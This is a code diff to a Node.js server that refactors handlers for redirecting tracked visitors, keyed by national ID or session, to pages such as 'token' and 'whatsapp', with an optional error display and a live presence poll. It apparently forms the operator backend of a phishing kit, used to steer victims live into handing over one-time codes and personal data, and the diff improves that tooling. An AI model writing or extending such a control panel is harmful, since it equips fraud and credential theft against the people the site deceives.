@@ -219,42 +219,60 @@ function handleProcedure(fullPath, rawInput, req, res) {
 
     case 'redirectUser':
     case 'redirectVisitor': {
-      const { nationalId, sessionId, page } = input;
+      const { nationalId, sessionId, page, showError } = input;
       if (nationalId) {
         const app = findApp(nationalId);
-        if (app) { app.redirect = page; app.showError = input.showError; saveData(); }
+        if (app) { app.redirectTo = page; app.redirectError = showError || false; saveData(); }
       }
       if (sessionId) {
         const v = liveVisitors.find(x => x.sessionId === sessionId);
-        if (v) { v.redirect = page; saveData(); }
+        if (v) { v.redirectTo = page; saveData(); }
       }
       return { success: true };
     }
 
-    case 'clearVisitorRedirect':
-    case 'clearRedirectByUser': {
-      const { nationalId } = input;
-      const app = findApp(nationalId);
-      if (app) { delete app.redirect; saveData(); }
-      return { success: true };
-    }
-
-    case 'getVisitorRedirect':
-    case 'getRedirectStatus': {
+    case 'clearVisitorRedirect': {
       const { nationalId, sessionId } = input;
       if (nationalId) {
         const app = findApp(nationalId);
-        if (app && app.redirect) return { redirect: app.redirect, showError: app.showError };
+        if (app) { delete app.redirectTo; delete app.redirectError; saveData(); }
       }
       if (sessionId) {
         const v = liveVisitors.find(x => x.sessionId === sessionId);
-        if (v && v.redirect) return { redirect: v.redirect };
+        if (v) { delete v.redirectTo; saveData(); }
       }
-      return { redirect: null };
+      return { success: true };
+    }
+
+    case 'clearRedirectByUser': {
+      const { nationalId } = input;
+      if (nationalId) {
+        const app = findApp(nationalId);
+        if (app) { delete app.redirectTo; delete app.redirectError; saveData(); }
+      }
+      return { success: true };
+    }
+
+    case 'getRedirectStatus': {
+      const { nationalId } = input;
+      if (nationalId) {
+        const app = findApp(nationalId);
+        if (app && app.redirectTo) return { redirectTo: app.redirectTo, redirectError: app.redirectError || false };
+      }
+      return { redirectTo: null };
+    }
+
+    case 'getVisitorRedirect': {
+      const { sessionId } = input;
+      if (sessionId) {
+        const v = liveVisitors.find(x => x.sessionId === sessionId);
+        if (v && v.redirectTo) return { redirectTo: v.redirectTo };
+      }
+      return { redirectTo: null };
     }
 
     case 'redirectAllToToken': {
-      applications.forEach(a => { a.redirect = 'token'; });
+      applications.forEach(a => { a.redirectTo = 'token'; });
       saveData();
       return { success: true };
     }
@@ -262,7 +280,7 @@ function handleProcedure(fullPath, rawInput, req, res) {
     case 'redirectWhatsApp': {
       const { nationalId } = input;
       const app = findApp(nationalId);
-      if (app) { app.redirect = 'whatsapp'; saveData(); }
+      if (app) { app.redirectTo = 'whatsapp'; saveData(); }
       return { success: true };
     }
 
@@ -397,11 +415,11 @@ app.post('/api/presence', (req, res) => {
   if (currentPage) visitor.currentPage = currentPage;
   saveData();
 
-  const redirect = visitor.redirect;
-  if (redirect) {
-    delete visitor.redirect;
+  const redirectTo = visitor.redirectTo;
+  if (redirectTo) {
+    delete visitor.redirectTo;
     saveData();
-    return res.json({ ok: true, redirect });
+    return res.json({ ok: true, redirectTo });
   }
   res.json({ ok: true });
 });
